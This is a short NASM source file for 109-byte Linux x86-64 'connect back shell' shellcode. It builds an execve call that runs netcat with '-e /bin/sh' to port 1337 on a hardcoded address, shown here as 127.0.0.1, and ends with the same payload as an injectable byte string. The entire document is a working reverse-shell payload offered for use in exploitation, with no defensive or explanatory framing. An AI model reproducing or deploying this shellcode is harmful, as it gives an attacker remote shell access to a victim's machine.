; { Title: Shellcode linux/x86-64 connect back shell }

; Author    : Gaussillusion
; Len       : 109 bytes
; Language  : Nasm

;syscall: execve("/bin/nc",{"/bin/nc","ip","1337","-e","/bin/sh"},NULL)

BITS 64
xor    	rdx,rdx
mov 	rdi,0x636e2f6e69622fff
shr	rdi,0x08
push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
push 	rcx
mov	rcx,rsp

mov     rbx,0x652dffffffffffff
shr	rbx,0x30
push	rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff
shr 	r10,0x20
push 	r10
mov	r10,rsp

jmp short ip
continue:
pop 	r9

push	rdx  ;push NULL
push 	rcx  ;push address of 'bin/sh'
push	rbx  ;push address of '-e'
push	r10  ;push address of '1337'
push	r9   ;push address of 'ip'
push 	rdi  ;push address of '/bin/nc'

mov    	rsi,rsp
mov    	al,59
syscall


ip:
	call  continue
	db "127.0.0.1"


;______________________bytecode_______________________
;\x48\x31\xd2\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63
;\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62
;\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x48\x89\xe1
;\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\x48\xc1\xeb
;\x30\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33
;\x33\x37\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\xeb\x11
;\x41\x59\x52\x51\x53\x41\x52\x41\x51\x57\x48\x89\xe6
;\xb0\x3b\x0f\x05\xe8\xea\xff\xff\xff\x31\x32\x37\x2e
;\x30\x2e\x30\x2e\x31
;______________________bytecode_______________________